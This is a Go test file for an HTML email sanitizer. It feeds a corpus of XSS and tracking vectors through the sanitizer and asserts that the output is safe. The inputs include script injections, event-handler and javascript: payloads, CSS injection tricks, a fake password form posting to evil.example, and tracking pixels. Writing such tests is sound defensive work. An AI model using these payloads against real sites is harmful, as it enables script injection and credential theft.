package sanitize

import (
	"strings"
	"testing"

	"golang.org/x/net/html"
)

// assertSafe parses the OUTPUT and checks structural invariants that must hold
// for every input, however hostile.
func assertSafe(t *testing.T, name, out string, remote bool) {
	t.Helper()
	okTag := map[string]bool{"html": true, "head": true, "body": true, "meta": true, "style": true}
	for k := range allowedTags {
		okTag[k] = true
	}
	z := html.NewTokenizer(strings.NewReader(out))
	inStyle := false
	for {
		tt := z.Next()
		if tt == html.ErrorToken {
			return
		}
		tok := z.Token()
		switch tt {
		case html.StartTagToken, html.SelfClosingTagToken:
			if !okTag[tok.Data] {
				t.Errorf("%s: disallowed tag <%s> in output", name, tok.Data)
			}
			inStyle = tok.Data == "style"
			if tok.Data == "meta" {
				continue // the wrapper's own CSP/referrer/viewport metas
			}
			for _, a := range tok.Attr {
				k := strings.ToLower(a.Key)
				if strings.HasPrefix(k, "on") {
					t.Errorf("%s: event handler %s", name, k)
				}
				v := strings.ToLower(cleanURL(a.Val))
				switch k {
				case "href":
					if !(strings.HasPrefix(v, "http://") || strings.HasPrefix(v, "https://") || strings.HasPrefix(v, "mailto:") || strings.HasPrefix(v, "tel:")) {
						t.Errorf("%s: bad href %q", name, a.Val)
					}
				case "src":
					if !strings.HasPrefix(v, "data:image/") && !(remote && strings.HasPrefix(v, "http")) {
						t.Errorf("%s: bad src %q", name, a.Val)
					}
				case "srcset", "background", "action", "formaction", "xlink:href", "poster", "ping", "data", "codebase", "id", "name":
					t.Errorf("%s: attribute %s survived", name, k)
				case "style":
					checkCSS(t, name, a.Val, remote)
				}
			}
			if tok.Data == "a" {
				var tgt, rel string
				for _, a := range tok.Attr {
					if a.Key == "target" {
						tgt = a.Val
					}
					if a.Key == "rel" {
						rel = a.Val
					}
				}
				hasHref := false
				for _, a := range tok.Attr {
					hasHref = hasHref || a.Key == "href"
				}
				if hasHref && (tgt != "_blank" || rel != "noopener noreferrer") {
					t.Errorf("%s: link without target/rel: %+v", name, tok.Attr)
				}
			}
		case html.TextToken:
			if inStyle {
				checkCSS(t, name, tok.Data, remote)
				inStyle = false
			}
		case html.EndTagToken:
			inStyle = false
		}
	}
}

func checkCSS(t *testing.T, name, css string, remote bool) {
	t.Helper()
	l := strings.ToLower(css)
	for _, bad := range []string{"@import", "expression", "javascript:", "@font-face", "behavior", "-moz-binding", "\\", "position:", "<"} {
		if strings.Contains(l, bad) {
			t.Errorf("%s: css contains %q: %s", name, bad, css)
		}
	}
	if !remote && (strings.Contains(l, "url(http") || strings.Contains(l, "url(//") || strings.Contains(l, "url(\"http") || strings.Contains(l, "url('http")) {
		t.Errorf("%s: remote url() with remote blocked: %s", name, css)
	}
}

type vector struct {
	name string
	in   string
	// substrings that must NOT appear in the output (case-insensitive)
	gone []string
	// substrings that must appear
	kept []string
}

var corpus = []vector{
	{"script tag", `<p>hi</p><script>alert(1)</script>`, []string{"<script", "alert(1)"}, []string{"<p>hi</p>"}},
	{"script uppercase", `<SCRIPT SRC=//evil/x.js></SCRIPT>ok`, []string{"script", "evil"}, []string{"ok"}},
	{"script split", `<scr<script>ipt>alert(1)</scr</script>ipt>`, []string{"<script"}, nil},
	{"img onerror", `<img src=x onerror=alert(1)>`, []string{"onerror", "alert"}, nil},
	{"img onerror quoted", `<IMG SRC="x" OnError="alert(document.cookie)">`, []string{"onerror", "cookie"}, nil},
	{"body onload", `<body onload=alert(1)>text</body>`, []string{"onload", "alert"}, []string{"text"}},
	{"svg onload", `<svg onload=alert(1)><circle/></svg>after`, []string{"svg", "onload", "alert"}, []string{"after"}},
	{"svg script", `<svg><script>alert(1)</script></svg>x`, []string{"svg", "script", "alert"}, []string{"x"}},
	{"math", `<math><mi xlink:href="javascript:alert(1)">x</mi></math>y`, []string{"math", "javascript"}, []string{"y"}},
	{"iframe", `<iframe src="https://evil.example/"></iframe>safe`, []string{"iframe", "evil"}, []string{"safe"}},
	{"iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`, []string{"iframe", "srcdoc", "alert"}, nil},
	{"object", `<object data="javascript:alert(1)"></object>`, []string{"object", "javascript"}, nil},
	{"embed", `<embed src="x.swf">e`, []string{"embed", "x.swf"}, []string{"e"}},
	{"form", `<form action="https://evil.example/steal"><input name=pw type=password><button>Go</button></form>text`, []string{"<form", "<input", "evil.example", "<button", "password"}, []string{"text"}},
	{"formaction", `<button formaction="javascript:alert(1)">x</button>`, []string{"formaction", "javascript"}, nil},
	{"link stylesheet", `<link rel=stylesheet href="https://evil.example/x.css">z`, []string{"<link", "evil.example"}, []string{"z"}},
	{"meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example/">m`, []string{"refresh", "evil.example"}, []string{"m"}},
	{"base", `<base href="https://evil.example/"><a href="/x">rel</a>`, []string{"evil.example", "<base"}, []string{"rel"}},
	{"js href", `<a href="javascript:alert(1)">click</a>`, []string{"javascript", "alert"}, []string{"click"}},
	{"js href mixed case", `<a href="JaVaScRiPt:alert(1)">c</a>`, []string{"javascript", "alert"}, nil},
	{"js href tab", "<a href=\"java\tscript:alert(1)\">c</a>", []string{"script:", "alert"}, nil},
	{"js href newline", "<a href=\"jav&#x0A;ascript:alert(1)\">c</a>", []string{"script:", "alert"}, nil},
	{"js href entity", `<a href="&#106;avascript:alert(1)">c</a>`, []string{"script:", "alert"}, nil},
	{"js href leading space", `<a href=" javascript:alert(1)">c</a>`, []string{"script:", "alert"}, nil},
	{"vbscript", `<a href="vbscript:msgbox(1)">c</a>`, []string{"vbscript"}, nil},
	{"data href", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">c</a>`, []string{"data:text/html", "PHNj"}, nil},
	{"file href", `<a href="file:///etc/passwd">c</a>`, []string{"file:"}, nil},
	{"relative href", `<a href="/steal">c</a><a href="#x">d</a>`, []string{`href="/steal"`, `href="#x"`}, []string{"c", "d"}},
	{"style tag import", `<style>@import url(https://evil.example/x.css); p{color:red}</style><p>x</p>`, []string{"@import", "evil.example"}, []string{"color:red"}},
	{"style font-face", `<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)} p{color:blue}</style>`, []string{"font-face", "evil.example"}, []string{"color:blue"}},
	{"style url bg", `<style>p{background:url(https://tracker.example/p.gif)}</style><p>x</p>`, []string{"tracker.example"}, nil},
	{"style attr url", `<p style="background-image:url('https://tracker.example/p.gif')">x</p>`, []string{"tracker.example"}, []string{">x</p>"}},
	{"style attr expression", `<p style="width:expression(alert(1))">x</p>`, []string{"expression", "alert"}, nil},
	{"style attr javascript", `<p style="background:url(javascript:alert(1))">x</p>`, []string{"javascript"}, nil},
	{"style escaped", `<p style="b\61ckground:u\72l(https://tracker.example/x)">x</p>`, []string{"tracker.example", "\\"}, nil},
	{"style position", `<div style="position:fixed;top:0;left:0;width:100%;height:100%;color:red">overlay</div>`, []string{"position", "fixed"}, []string{"color:red"}},
	{"style behavior", `<p style="behavior:url(x.htc)">x</p>`, []string{"behavior", "htc"}, nil},
	{"style moz-binding", `<p style="-moz-binding:url(http://evil.example/x.xml#y)">x</p>`, []string{"binding", "evil.example"}, nil},
	{"style content", `<style>p::before{content:url(https://evil.example/x)}</style>`, []string{"evil.example", "content"}, nil},
	{"style selector junk", `<style>p{color:red}</style><style>} x{color:red} </style>`, []string{"evil"}, nil},
	{"style closing injection", `<p style="color:red;}</style><script>alert(1)</script>">x</p>`, []string{"<script", "alert"}, nil},
	{"style text breakout", `<style>p{color:red}</style><script>alert(1)</script></style>`, []string{"<script", "alert"}, nil},
	{"style media", `<style>@media (max-width:600px){p{color:green}} @media x{p{background:url(https://evil.example/a)}}</style>`, []string{"evil.example"}, []string{"@media (max-width:600px){p{color:green}}"}},
	{"background attr", `<table background="https://tracker.example/bg.png"><tr><td>c</td></tr></table>`, []string{"tracker.example", "background"}, []string{"<td>c</td>"}},
	{"tracking pixel", `<img src="https://track.example/o.gif?u=1" width=1 height=1>`, []string{"track.example", "src="}, nil},
	{"tracking pixel protocol-relative", `<img src="//track.example/o.gif">`, []string{"track.example"}, nil},
	{"srcset", `<img srcset="https://track.example/a.png 1x, https://track.example/b.png 2x" src="x">`, []string{"srcset", "track.example"}, nil},
	{"picture source", `<picture><source srcset="https://track.example/a.webp"><img src="https://track.example/a.png"></picture>`, []string{"track.example", "<picture", "<source"}, nil},
	{"input image", `<input type=image src="https://track.example/x.png">`, []string{"track.example", "<input"}, nil},
	{"video poster", `<video poster="https://track.example/p.png" src="x"></video>`, []string{"track.example", "<video"}, nil},
	{"audio", `<audio src="https://track.example/a.mp3" onerror=alert(1)></audio>`, []string{"track.example", "<audio", "onerror"}, nil},
	{"svg image in data", `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`, []string{"svg", "PHN2"}, nil},
	{"data html img", `<img src="data:text/html,<script>alert(1)</script>">`, []string{"data:text", "alert"}, nil},
	{"ping", `<a href="https://ok.example/" ping="https://track.example/p">x</a>`, []string{"ping", "track.example/p"}, []string{`href="https://ok.example/"`}},
	{"a target other", `<a href="https://ok.example/" target="_top" rel="opener">x</a>`, []string{"_top", `rel="opener"`}, []string{`target="_blank"`, `rel="noopener noreferrer"`}},
	{"id clobber", `<img id="body" name="cookie" src="x"><a name="x" id="y">z</a>`, []string{`id=`, `name=`}, nil},
	{"noscript", `<noscript><img src=x onerror=alert(1)></noscript>`, []string{"onerror", "noscript"}, nil},
	{"template", `<template><script>alert(1)</script></template>`, []string{"alert", "template"}, nil},
	{"comment conditional", `<!--[if mso]><script>alert(1)</script><![endif]-->visible`, []string{"alert", "mso"}, []string{"visible"}},
	{"comment breakout", `<!--><img src=x onerror=alert(1)>-->`, []string{"onerror"}, nil},
	{"mxss textarea", `<textarea></textarea><img src=x onerror=alert(1)>`, []string{"onerror"}, nil},
	{"mxss title", `<title></title><img src=x onerror=alert(1)></title>`, []string{"onerror"}, nil},
	{"unclosed attr", `<a href="https://ok.example/ onclick=alert(1)>x</a><b>bold</b>`, []string{"onclick"}, nil},
	{"null bytes", "<scr\x00ipt>alert(1)</scr\x00ipt><p>ok</p>", []string{"<script"}, []string{"ok"}},
	{"attr entity quote break", `<a href="https://ok.example/&quot; onmouseover=&quot;alert(1)">x</a>`, []string{"onmouseover=\"alert"}, nil},
	{"marquee", `<marquee onstart=alert(1)>x</marquee>`, []string{"marquee", "onstart"}, nil},
	{"details ontoggle", `<details open ontoggle=alert(1)>d</details>`, []string{"ontoggle"}, []string{"<details>"}},
	{"xmp", `<xmp><img src=x onerror=alert(1)></xmp>`, []string{"onerror"}, nil},
	{"object in table", `<table><tr><td><object data=x></object></td></tr></table>`, []string{"object"}, []string{"<td>"}},
	{"font face", `<font face="Arial" color="red" size="3">f</font>`, nil, []string{`face="Arial"`, `color="red"`}},
	{"unbalanced", `<div><p>one<b>two</div>three`, nil, []string{"<div><p>one<b>two</b></p></div>three"}},
}

func TestHostileCorpus(t *testing.T) {
	for _, remote := range []bool{false, true} {
		for _, v := range corpus {
			name := v.name
			if remote {
				name += "/remote"
			}
			res := Sanitize(v.in, Options{LoadRemote: remote})
			body := res.HTML
			// compare only the message part: the wrapper has its own CSP/style
			if i := strings.Index(body, "</style>"); i >= 0 {
				body = body[i+len("</style>"):] // skip the wrapper's CSP meta and base CSS
			}
			lb := strings.ToLower(body)
			for _, g := range v.gone {
				// remote mode legitimately keeps http(s) image/background URLs
				// (structural safety is asserted by assertSafe)
				if remote && (strings.Contains(g, "track") || strings.Contains(g, "evil.example") || g == "src=") {
					continue
				}
				if strings.Contains(lb, strings.ToLower(g)) {
					t.Errorf("%s: output still contains %q:\n%s", name, g, body)
				}
			}
			for _, k := range v.kept {
				if remote && strings.Contains(k, "evil") {
					continue
				}
				if !strings.Contains(body, k) {
					t.Errorf("%s: output lost %q:\n%s", name, k, body)
				}
			}
			assertSafe(t, name, res.HTML, remote)
		}
	}
}

func TestRemoteBlockedAndCounted(t *testing.T) {
	in := `<p>hi</p><img src="https://t.example/1.gif"><img src="http://t.example/2.gif"><div style="background:url(https://t.example/3.png)">x</div>`
	r := Sanitize(in, Options{})
	if !r.HasRemote || r.Blocked != 3 {
		t.Fatalf("HasRemote=%v Blocked=%d", r.HasRemote, r.Blocked)
	}
	if strings.Contains(r.HTML, "t.example") || strings.Contains(r.HTML, "img-src data: https") {
		t.Fatalf("remote leaked: %s", r.HTML)
	}
	if !strings.Contains(r.HTML, "img-src data:;") {
		t.Fatalf("CSP should block remote images: %s", r.HTML)
	}
	r = Sanitize(in, Options{LoadRemote: true})
	if !r.HasRemote || r.Blocked != 0 {
		t.Fatalf("loaded: HasRemote=%v Blocked=%d", r.HasRemote, r.Blocked)
	}
	if !strings.Contains(r.HTML, `src="https://t.example/1.gif" referrerpolicy="no-referrer"`) {
		t.Fatalf("image not kept when asked: %s", r.HTML)
	}
	if !strings.Contains(r.HTML, "img-src data: https: http:") {
		t.Fatalf("CSP should allow images when asked: %s", r.HTML)
	}
	r = Sanitize(`<p>no remote</p>`, Options{})
	if r.HasRemote || r.Blocked != 0 {
		t.Fatal("false positive")
	}
}

func TestCIDImages(t *testing.T) {
	data := "data:image/png;base64,iVBORw0KGgo="
	o := Options{ResolveCID: func(cid string) (string, bool) {
		switch cid {
		case "logo@x":
			return data, true
		case "evil@x":
			return "data:image/svg+xml;base64,PHN2Zz4=", true
		}
		return "", false
	}}
	r := Sanitize(`<img src="cid:logo@x"><img src="CID:<logo@x>"><img src="cid:missing"><img src="cid:evil@x">`, o)
	if strings.Count(r.HTML, data) != 2 {
		t.Fatalf("cid mapping: %s", r.HTML)
	}
	if strings.Contains(r.HTML, "svg") || strings.Contains(r.HTML, "missing") {
		t.Fatalf("unsafe/missing cid kept: %s", r.HTML)
	}
	if r.HasRemote {
		t.Fatal("cid is not remote")
	}
	r = Sanitize(`<div style="background-image:url(cid:logo@x)">x</div>`, o)
	if !strings.Contains(r.HTML, "url("+data+")") {
		t.Fatalf("css cid: %s", r.HTML)
	}
}

func TestLinksRewritten(t *testing.T) {
	r := Sanitize(`<a href="https://example.org/a?b=1&c=2">go</a> <a href="mailto:a@b.test">m</a> <a href="tel:+123">t</a>`, Options{})
	for _, want := range []string{
		`href="https://example.org/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer"`,
		`href="mailto:a@b.test" target="_blank"`, `href="tel:+123"`,
	} {
		if !strings.Contains(r.HTML, want) {
			t.Errorf("missing %q in %s", want, r.HTML)
		}
	}
}

func TestDocumentShell(t *testing.T) {
	r := Sanitize(`<p>x</p>`, Options{})
	for _, want := range []string{"<!doctype html>", `charset="utf-8"`, "default-src 'none'", "font-src 'none'", "base-uri 'none'", "form-action 'none'", `name="referrer"`} {
		if !strings.Contains(r.HTML, want) {
			t.Errorf("document lacks %q", want)
		}
	}
	if strings.Contains(r.HTML, "script-src") && !strings.Contains(r.HTML, "default-src 'none'") {
		t.Error("CSP must default to none")
	}
}

func TestBodyBgcolorFolded(t *testing.T) {
	r := Sanitize(`<body bgcolor="#eeeeee" onload="x()" style="color:#111"><p>x</p></body>`, Options{})
	if !strings.Contains(r.HTML, `bgcolor="#eeeeee"`) || strings.Contains(r.HTML, "onload") {
		t.Fatalf("%s", r.HTML)
	}
}

func TestPlainText(t *testing.T) {
	r := Sanitize2Plain("Hi <b>there</b> & see https://example.org/path?x=1&y=2. Also javascript:alert(1)\nline2")
	if !r.Plain {
		t.Fatal("Plain flag")
	}
	for _, want := range []string{"&lt;b&gt;there&lt;/b&gt;", `href="https://example.org/path?x=1&amp;y=2"`, ">https://example.org/path?x=1&amp;y=2</a>.", "white-space:pre-wrap", "javascript:alert(1)"} {
		if !strings.Contains(r.HTML, want) {
			t.Errorf("plain: missing %q in %s", want, r.HTML)
		}
	}
	if strings.Contains(r.HTML, "<b>") || strings.Contains(r.HTML, `href="javascript`) {
		t.Fatalf("plain text not escaped: %s", r.HTML)
	}
	assertSafe(t, "plain", r.HTML, false)
}

func Sanitize2Plain(s string) Result { return PlainText(s, Options{}) }

func TestHugeAndMalformedInputDoesNotPanic(t *testing.T) {
	inputs := []string{
		"", "<", "<<<<>>>>", "<a", `<a href="`, "<style>", "<style>p{", "<style>@media{", strings.Repeat("<div>", 20000), strings.Repeat("<b>x", 5000),
		"<style>" + strings.Repeat("a{b:c}", 10000) + "</style>", "\xff\xfe<p>bad utf8</p>", strings.Repeat("x", 3<<20),
	}
	for i, in := range inputs {
		r := Sanitize(in, Options{})
		assertSafe(t, "malformed", r.HTML, false)
		_ = i
	}
}

func FuzzSanitize(f *testing.F) {
	for _, v := range corpus {
		f.Add(v.in)
	}
	f.Fuzz(func(t *testing.T, in string) {
		for _, remote := range []bool{false, true} {
			r := Sanitize(in, Options{LoadRemote: remote})
			assertSafe(t, "fuzz", r.HTML, remote)
		}
	})
}

func TestCSSValues(t *testing.T) {
	o := CSSOptions{}
	cases := map[string]string{
		"color:red;font-size:14px":                   "color:red;font-size:14px",
		"COLOR : Red !important":                     "color:Red !important",
		"display:block":                              "display:block",
		"display:flex":                               "",
		"position:absolute":                          "",
		"width:100%;height:expression(1)":            "width:100%",
		"background:#fff url(https://a.example/x)":   "",
		"background:url(data:image/png;base64,AAAA)": "background:url(data:image/png;base64,AAAA)",
		"font-family:'Helvetica Neue',Arial":         "font-family:'Helvetica Neue',Arial",
		"margin:0 auto;;padding:":                    "margin:0 auto",
		"color:red;/* c */background-color:#000":     "color:red;background-color:#000",
	}
	for in, want := range cases {
		if got := SanitizeDeclarations(in, o); got != want {
			t.Errorf("%q => %q, want %q", in, got, want)
		}
	}
}

func TestCSSRemoteURLCannotBreakOut(t *testing.T) {
	o := CSSOptions{LoadRemote: true}
	cases := map[string]string{
		`background:url("https://a.example/x);position:fixed")`: "",
		`background:url("https://a.example/x);color:red;(")`:    "",
		`background:url('https://a.example/x,y')`:               "",
		`background:url("https://a.example/x y")`:               "background:url(https://a.example/xy)",
		`background-image:url("https://a.example/a.png")`:       "background-image:url(https://a.example/a.png)",
		`background:url("https://a.example/a%28b%29.png")`:      "background:url(https://a.example/a%28b%29.png)",
		`background:url("https://a.example/a(b).png")`:          "background:url(https://a.example/a%28b%29.png)",
	}
	for in, want := range cases {
		if got := SanitizeDeclarations(in, o); got != want {
			t.Errorf("%q => %q, want %q", in, got, want)
		}
	}
}

func TestBlockedImagePlaceholder(t *testing.T) {
	r := Sanitize(`<p><img src="https://t.example/a.png" width="120" height="60" alt="Logo <b>"><img src="https://t.example/p.gif" width="1" height="1"></p>`, Options{})
	if strings.Contains(r.HTML, "<img") {
		t.Fatalf("blocked image kept as <img>: %s", r.HTML)
	}
	if !strings.Contains(r.HTML, `<span class="wm-img-blocked" data-blocked="1" style="width:120px;height:60px;">Logo &lt;b&gt;</span>`) {
		t.Fatalf("no sized placeholder: %s", r.HTML)
	}
	if strings.Count(r.HTML, "wm-img-blocked\"") != 1 {
		t.Fatalf("tracking pixel left a placeholder: %s", r.HTML)
	}
	if c := Sanitize(`<img src="cid:missing@x"><img src="https://t.example/b.png">`, Options{}); strings.Contains(c.HTML, "<img") || strings.Contains(c.HTML, "wm-img-blocked\"") {
		t.Fatalf("unsized, alt-less image left something: %s", c.HTML)
	}
	if r.Blocked != 2 || !r.HasRemote {
		t.Fatalf("blocked=%d remote=%v", r.Blocked, r.HasRemote)
	}
	if l := Sanitize(`<img src="https://t.example/a.png" width="120">`, Options{LoadRemote: true}); !strings.Contains(l.HTML, `<img width="120" src="https://t.example/a.png"`) && !strings.Contains(l.HTML, `src="https://t.example/a.png"`) {
		t.Fatalf("allowed image not kept: %s", l.HTML)
	}
}
